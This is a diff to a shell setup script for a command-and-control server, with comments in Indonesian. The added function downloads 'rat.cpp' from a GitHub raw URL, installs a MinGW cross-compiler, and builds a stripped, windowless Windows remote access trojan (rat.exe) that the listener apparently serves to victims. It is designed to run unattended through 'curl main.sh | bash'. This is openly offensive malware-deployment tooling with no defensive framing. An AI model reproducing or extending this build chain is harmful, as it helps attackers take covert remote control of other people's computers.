@@ -5,6 +5,8 @@ LOG_DIR="./received_logs"
 SCRIPT_NAME="c2_listener.py"
 SERVER_LOG="c2_server.log"
 NGROK_AUTH_TOKEN="${NGROK_AUTH_TOKEN:-}"
+RAW_BASE="${RAW_BASE:-https://raw.githubusercontent.com/Mizyal13/script/main}"
+C2_AGENT_SRC="${C2_AGENT_SRC:-$RAW_BASE/rat.cpp}"
 
 if [ "$(id -u)" -eq 0 ]; then
     SUDO=""
@@ -51,6 +53,63 @@ fi
 
 mkdir -p "$LOG_DIR"
 echo " [+] Created log storage directory: $LOG_DIR"
+
+# ---------------------------------------------------------------------------
+# Auto-build agent Windows (rat.exe) dari rat.cpp versi terbaru di GitHub.
+# Dipanggil otomatis, jadi curl main.sh | bash langsung jalan tanpa setting.
+# ---------------------------------------------------------------------------
+build_rat_agent() {
+    echo " [*] Menyiapkan agent Windows (rat.exe)..."
+    local HAVE_CURL=0
+    command -v curl > /dev/null 2>&1 && HAVE_CURL=1
+
+    if [ "$HAVE_CURL" = "1" ]; then
+        echo " [*] Mengunduh rat.cpp versi terbaru dari $C2_AGENT_SRC"
+        if ! curl -fsSL "$C2_AGENT_SRC" -o rat.cpp; then
+            if [ ! -f "rat.cpp" ]; then
+                echo " [!] Gagal unduh rat.cpp dan tidak ada salinan lokal."
+            else
+                echo " [!] Gagal unduh rat.cpp, memakai salinan lokal."
+            fi
+        fi
+    elif [ ! -f "rat.cpp" ]; then
+        echo " [!] rat.cpp tidak ada dan curl tidak tersedia."
+    fi
+
+    if [ ! -f "rat.cpp" ]; then
+        echo " [!] Lewat build rat.exe (jalankan ./build.sh manual jika perlu)."
+        return 0
+    fi
+
+    if ! command -v x86_64-w64-mingw32-g++ > /dev/null 2>&1; then
+        if command -v apt-get > /dev/null 2>&1; then
+            echo " [*] Memasang mingw-w64 (g++-mingw-w64-x86-64) via apt..."
+            $SUDO apt-get update -qq 2>/dev/null || true
+            $SUDO apt-get install -y g++-mingw-w64-x86-64 > /dev/null 2>&1 || true
+        else
+            echo " [!] Tidak ada apt-get di sistem ini; lewati build rat.exe."
+            return 0
+        fi
+    fi
+
+    if ! command -v x86_64-w64-mingw32-g++ > /dev/null 2>&1; then
+        echo " [!] Compiler mingw-w64 masih belum ada. Cek manual: ./build.sh"
+        return 0
+    fi
+
+    if [ ! -f "rat.exe" ] || [ "rat.cpp" -nt "rat.exe" ]; then
+        echo " [*] Mengompilasi rat.exe..."
+        if x86_64-w64-mingw32-g++ -std=c++11 -static -O2 -s -mwindows rat.cpp -lws2_32 -o rat.exe; then
+            echo " [+] rat.exe siap: $(pwd)/rat.exe"
+        else
+            echo " [!] Kompilasi gagal; /agent/rat.exe akan 404 sampai dibangun manual (./build.sh)."
+        fi
+    else
+        echo " [+] rat.exe sudah ada dan terbaru."
+    fi
+    return 0
+}
+build_rat_agent || true
 
 echo " [*] Writing listener script to $SCRIPT_NAME..."
 
